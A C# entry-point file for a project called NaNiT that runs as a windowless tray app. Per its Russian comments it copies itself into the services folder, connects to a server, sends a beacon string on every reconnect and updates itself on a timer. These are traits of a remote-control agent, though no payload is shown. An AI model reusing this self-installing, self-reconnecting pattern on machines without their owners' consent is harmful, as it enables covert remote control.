using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;
using Timer = System.Threading.Timer;

namespace NaNiT
{
    class Program
    {
        public static NotifyIcon notifyIcon = null;
        public static TcpClient client;
        public static NetworkStream stream;
        public static TimerCallback Upd = new TimerCallback(CheckServiceUpdate);

        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Functions.FirstRunOptionsLoad();                                /// Первоначальная настройка. Загрузка из реестра и прописывание некоторых параметров
            Functions.AutoSelfInstall(false);                               /// Копирование себя в папку сервисов, запуск оттуда удаление лишнего           
            CFunc.Chat();                                                   /// Старт соединения с сервером

            Timer UpdateTimer = new Timer(Upd, null, 0, 3000000);
            Thread ServStates = new Thread(new ThreadStart(TempServRun));
            ServStates.Name = "Server sender and reopener";
            ServStates.Start();

            Application.Run();
        }


        public static void CheckServiceUpdate(object obj)
        {
            Thread t2 = Thread.CurrentThread;
            t2.Name = "Update Timer";
            ServiceWork.CheckUpdServer();
            ServiceWork.ServiceInit();
            Thread.Sleep(5000);

            if (Globals.adrUpdNum != -1)
                if (Globals.nanitSvcVer != Globals.updVerAvi)
                {
                    ServiceWork.UpdateService();
                }
        }

        public static void TempServRun()
        {
            do
            {
                while (!Globals.serverIsConnected)
                {
                    CFunc.Chat();
                    Thread.Sleep(10000);
                    if (Globals.serverIsConnected)
                        CFunc.SendMessage("i_C@N_Y0U-");
                }
                while (Globals.serverIsConnected)
                {
                    Thread.Sleep(10000);

                }
            }
            while (true);
        }
    }
}